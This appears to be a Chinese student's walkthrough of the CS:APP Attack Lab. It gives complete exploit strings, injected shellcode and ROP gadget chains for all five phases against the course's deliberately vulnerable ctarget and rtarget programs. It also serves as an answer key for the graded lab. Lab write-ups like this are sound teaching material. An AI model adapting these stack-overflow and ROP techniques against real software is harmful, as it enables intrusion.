# 前言

`target1` 中的文件包括

- `README.txt`： 描述目录内容的文件
- `ctarget`： 易受代码注入攻击的可执行程序
- `rtarget`： 易受面向返回编程攻击的可执行程序
- `cookie.txt`： 8 位十六进制代码，在攻击中用作唯一标识符。
- `farm.c`： 目标程序 “gadget farm ”的源代码，你将用它来生成面向返回的编程攻击时使用。
- `hex2raw`： 用于生成攻击字符串的实用程序

在官方文档中每个question，有题目要求，和解题指导要仔细看。

参考资料：

[Lab下载链接](https://csapp.cs.cmu.edu/3e/labs.html)

[AttackLab官方文档](https://csapp.cs.cmu.edu/3e/attacklab.pdf)

[B站讲解推荐](https://www.bilibili.com/video/BV1yA411F7pD/?spm_id_from=333.337.search-card.all.click&vd_source=c7a2228562ec56ca67689b8d47bb87ba)

[大佬笔记](https://github.com/Exely/CSAPP-Labs/blob/master/notes/attack.md)

# Code Injection Attacks

在前三个阶段，利用字符串将攻击Ctarget。该程序的设置方式是从一个运行到另一个运行的方式将保持一致，因此堆栈上的数据可以视为可执行的代码。这些功能使该程序容易受到攻击，其中利用字符串包含可执行代码的字节编码。

## phase1

在 CTARGET 中，函数 `getbuf` 被一个具有以下 C 代码的函数测试调用：

 ![ 2024-11-25 164029.png](https://s2.loli.net/2024/11/25/B6Ci7kOjdDmWzxP.png)

 ![ 2024-11-25 164034.png](https://s2.loli.net/2024/11/25/51dNoORgb7YwGt8.png)

任务是让 CTARGET 在 `getbuf`执行返回语句时执行 `touch1` 的代码，而不是返回`test`。

GBD `disas`命令得到汇编代码（更详细的GDB命令可以看我的Bomb Lab)

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp	# 给出了40字节的栈空间
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
```

```assembly
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp	# touch1地址0x4017c0
```

如何在函数结束的时候调用其他函数呢，调用函数时栈顶就是返回地址，如果把开辟的40字节栈空间都填充满，再将后面修改为`touch`1的函数地址(`0x4017c0`)，就可以在`getbuf`结束的时候调用`touch`1函数了

`hex2raw`是将16进制数转换为字符串生成的程序，所以随便输入40个16进制数再加上`touch1`的地址即可

`ans1.txt`

> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> c0 17 40 00

注入后的栈帧

> getbuf返回地址	   00 40 17 c0 
> rsp + 32			01 01 01 01 01 01 01 01
> rsp + 24			01 01 01 01 01 01 01 01
> rsp + 16			01 01 01 01 01 01 01 01
> rsp + 8			  01 01 01 01 01 01 01 01
> rsp 				01 01 01 01 01 01 01 01

因为x86是小端机所以地址是`c0 17 40 00`，`./hex2raw < ans1.txt | ./ctarget -q`来测试，`ctarget`默认连接CMU服务器，-q取消连接

出现PASS就是通过了

![ 2024-11-25 172443.png](https://s2.loli.net/2024/11/25/wnvKqYeNbQgpHG3.png)

## phase 2

 ![ 2024-11-25 172951.png](https://s2.loli.net/2024/11/25/GuLmgEn2zXltCIr.png)

和上面一样，让`Ctarget`执行`touch2`代码，还要求了函数的参数`val`要与`cookie`相等，在官方文档中还提到了`cookie`要保存在`%rdi`中，`cookie.txt`可以发现`cookie`的值就是`0x59b997fa`

要注入的汇编代码

```assembly
movq  $0x59b997fa,%rdi	# 传值，将%rdi设置为cookie
pushq $0x004017ec		# 将touch2地址(0x4017ec)压入栈中
retq
```

通过`gcc -c`生成目标文件不链接，`objdump -d`反汇编查看上述指令的二进制码，然后需要得到`getbuf`函数执行时`%rsp`的值(0x5561dc78)，`getbuf`结束跳转回`%rsp`的位置执行我们设置的上述汇编代码

![ 2024-11-25 175617.png](https://s2.loli.net/2024/11/25/thK5EHeQrvwLgxZ.png)

ans2.txt

> 48 c7 c7 fa 97 b9 59
> 68 ec 17 40 00
> c3
> 01 01 01	
> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> 78 dc 61 55

注入后的栈帧

> getbuf返回地址	   55 61 dc 78
> rsp + 32			01 01 01 01 01 01 01 01
> rsp + 24			01 01 01 01 01 01 01 01
> rsp + 16			01 01 01 01 01 01 01 01
> rsp + 8			  01 01 01 c3  00 40 17 ec
> rsp 				68 59 b9 97 fa c7 c7 48

## phase 3

 ![ 2024-11-25 194841.png](https://s2.loli.net/2024/11/25/2ZCn69yFOeSpdND.png)

 ![ 2024-11-25 194847.png](https://s2.loli.net/2024/11/25/6xoG5lIpY7WbLrd.png)

和上面一样，让`Ctarget`执行`touch3`代码，这次传入字符数组的首地址。但不能想上一题一样把字符串放入字符数组中，因为`hexmatch`函数会把`buf`中的字节随机化，通过打断点得到其栈顶地址是 `0x5561dca0` ，可以把字符串数组地址存放在`0x5561dca8`，下面得到对应二进制指令。

```assembly
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi	# 存放数组指针
   7:	68 fa 18 40 00       	pushq  $0x4018fa		# 将touch2地址压入栈中
   c:	c3                   	retq
```

根据 `ASCII` 码，这里的 `cookie` 值 `0x59b997fa`再加上C语言字符末尾的`\0` 就是 `35 39 62 39 39 37 66 61 00`

ans3.txt

> 48 c7 c7 a8 dc 61 55 
> 68 fa 18 40 00 
> c3 
> 01 01 01
> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> 78 dc 61 55 00 00 00 00
> 35 39 62 39 39 37 66 61 00

#  Return-Oriented Programming

对程序Rtarget进行代码注射攻击比CTARGET要困难得多，
因为它使用两种技术来阻止这种攻击：

- 它使用随机化，以使堆栈位置与另一个运行之间的不同之处。这使得无法确定注射代码的位置。
- 它标记了将堆栈保存的内存部分是不可删除的，因此即使您可以设置程序对抗注射代码的开始，该程序将在细分故障时失败。

**ROP 的核心思想：**在启用了 DEP 的环境下，程序的堆栈和数据段是不可执行的。ROP 不需要注入新的代码，而是利用已有的代码片段。ROP 利用程序内的已存在的指令序列。这些指令序列以 `ret` 结尾，从而可以链接多个片段来实现复杂功能。攻击者构造一个伪堆栈帧链表，每个伪帧指向一个 *gadget* 的地址，并传递控制流到这些指令序列。

 ![ 2024-11-25 210434.png](https://s2.loli.net/2024/11/25/zEe1CJBdA2UkiuQ.png)

![](https://s2.loli.net/2024/11/25/Wiu3epEkfz7PVar.png)

RET：由单个字节0xC3编码。

NOP：由单个字节0x90编码。它的唯一效果是使程序计数器被1递增。

## phase 4

对于第4阶段，将重复第2阶段的攻击，但使用的*gadget farm*对程序进行了攻击。可以使用由以下指令类型组成的小工具构建解决方案，仅使用前八个x86-64寄存器（％rax –％rdi）。

想办法实现下面的两条语句

```assembly
popq %rax		# 58
movq %rax,%rdi	# 48 89 c7
```

```assembly
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq
00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3
```

通过`gcc -c`以及`objdump -d`重定向生成`farm.s`，在vim编辑器下通过`/48 89 c7`就可以查询有用到这几个指令语句。`pop`指令的地址是`4019ab`，`movq %rax,%rdi`指令地址是`0x4019a2`。ROP攻击就由`pop %rax`，再存入`cookie`，`movq %rax,%rdx`，再跳转到`touch2`。

`./hex2raw < ./ans/ans4.txt | ./rtarget -q`检验是否正确。

ans4.txt

> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> 01 01 01 01 01 01 01 01
> ab 19 40 00 00 00 00 00
> fa 97 b9 59 00 00 00 00
> a2 19 40 00 00 00 00 00
> ec 17 40 00 00 00 00 00


## phase 5

这里我放下前面参考链接里[大佬解题方法](https://github.com/Exely/CSAPP-Labs/blob/master/notes/attack.md)

要求将 `cookie` 字符串的地址存入 `%rdx` ，考虑到栈随机化，无法直接得到地址。注意到这里 `48 89 e0 90` 是 `movq %rsp,%rax` ，将栈顶的地址存在了 `%rax` ，可以利用这一点来传地址。

```assembly
0000000000401aab <setval_350>:
  401aab:       c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
  401ab1:       c3                      retq
```

由上题我们可以实现 `movq %rax,%rdi` ，是不是直接将传入的字符串存到栈顶，再将栈顶地址存入 `%rdi` 就做完了？这里要注意，如果直接将字符串存到栈顶， `48 89 e0 90 c3` 在返回时会跳转到栈顶，字符串就成要运行的指令了，就会发生错误。
这里考虑将栈顶地址加值传入，使得要传入的字符串与栈顶拉开距离，不被执行。（我开始试图用官方文档给的参考指令给 `%eax` 做加法，但很复杂还不一定能成，我把它附在了最后面[1]，有闲情再看吧T_T）这里的加法用到了一个文档里没有的指令：

```assembly
00000000004019d6 <add_xy>:
  4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:       c3                      retq
```

`04 37` 是 `add $0x37,%al` ，可以表示将传入的字符串存在距离栈顶 `0x37` （55）字节处。
由上，可以构造这样一个攻击链：
先填充 40 字节破坏栈，紧接着是 `movq %rsp,%rax`，将下一个栈顶位置存入 `%rax` ，代码位置是 `0x401aad`；接着 `add $0x37,%al` ，给 `%rax` 加值 `0x37` ，这段代码位置是 `0x4019d8` ；然后将 `%rax` 值传入函数的参数 `%rdi` ，代码位置由上题是 `0x4019a2` ，然后跳转到 `touch3` 函数，地址是 `0x4018fa` ；最后存入字符串，并在其前面填充字节使其地址与保存的栈顶地址相差 55 个字节，共要填充 `(55-3×8)=31` 个字节，所以答案可以是：

ans5.txt

>01 01 01 01 01 01 01 01 01 01
>01 01 01 01 01 01 01 01 01 01
>01 01 01 01 01 01 01 01 01 01
>01 01 01 01 01 01 01 01 01 01
>ad 1a 40 00 00 00 00 00
>d8 19 40 00 00 00 00 00
>a2 19 40 00 00 00 00 00
>fa 18 40 00 00 00 00 00
>01 01 01 01 01 01 01 01 01 01
>01 01 01 01 01 01 01 01 01 01
>01 01 01 01 01 01 01 01 01 01
>01
>35 39 62 39 39 37 66 61 00
